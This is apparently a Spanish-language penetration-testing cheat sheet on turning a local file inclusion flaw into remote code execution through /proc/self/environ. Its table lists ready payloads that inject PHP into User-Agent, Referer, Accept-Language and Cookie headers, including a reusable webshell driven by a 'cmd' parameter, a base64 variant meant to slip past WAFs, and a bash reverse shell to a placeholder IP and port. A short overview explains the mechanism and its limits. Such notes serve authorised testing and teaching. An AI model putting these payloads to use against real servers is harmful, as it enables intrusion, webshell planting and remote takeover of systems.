---
aliases:
tags:
  - type/cheatsheet
primary categories:
secondary categories:
tertiary categories:
type: CheatSheet
linked:
  - "[[File Inclusion]]"
---
# LFI To RCE - /proc/self/environ

***

## Cheatsheet

|              **Técnica**              |                                   **Descripción**                                   |                                       **Payload**                                       |
|:-------------------------------------:|:-----------------------------------------------------------------------------------:|:---------------------------------------------------------------------------------------:|
| <br>**Environ básico via User-Agent** | <br>Inyectar código PHP en el User-Agent y luego incluir /proc/self/environ<br><br> |          <br>UA: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>           |
|      <br>**Environ via Referer**      |                    <br>Inyectar código PHP en el header Referer                     |        <br>Referer: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>        |
|  <br>**Environ via Accept-Language**  |                 <br>Usar un header menos monitoreado para inyectar                  |    <br>Accept-Language: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>    |
|      <br>**Environ via Cookie**       |    <br>Inyectar en una cookie que se refleje en las variables de entorno<br><br>    |        <br>Cookie: `<?php system('id'); ?>` → LFI: `/proc/self/environ`<br><br>         |
|   <br>**Environ con reverse shell**   |             <br>Inyectar una reverse shell en vez de un comando simple              |   <br>UA: `<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/IP/PORT 0>&1'"); ?>`<br><br>   |
|     <br>**Environ con cmd param**     |                <br>Inyectar una webshell reutilizable vía parámetro                 | <br>UA: `<?php system($_GET['cmd']); ?>` → LFI: `/proc/self/environ&cmd=whoami`<br><br> |
|      <br>**Environ con base64**       |             <br>Encodear el payload para evadir WAFs o filtros<br><br>              |                <br>UA: `<?php system(base64_decode('aWQ=')); ?>`<br><br>                |
|   <br>**Environ via /proc/self/fd**   |      <br>Acceder al environ a través de file descriptors alternativos<br><br>       |                  <br>LFI: `/proc/self/fd/0`, `/proc/self/fd/2`<br><br>                  |
^lfi-environ


***

## Overview

En sistemas Linux, `/proc/self/environ` contiene las variables de entorno del proceso actual, que en el caso de un servidor web incluyen headers HTTP como `HTTP_USER_AGENT`. Si el proceso web tiene permisos de lectura sobre este archivo, el atacante puede inyectar código PHP en cualquier header HTTP que se refleje en el environ y después incluir el archivo con el LFI para ejecutarlo. Es conceptualmente similar al log poisoning pero más directo, ya que no necesitás conocer la ruta de un log específico. La limitación principal es que muchos servidores modernos corren con permisos restrictivos sobre `/proc`, y en configuraciones actuales este archivo suele no ser legible por el usuario del web server.


***
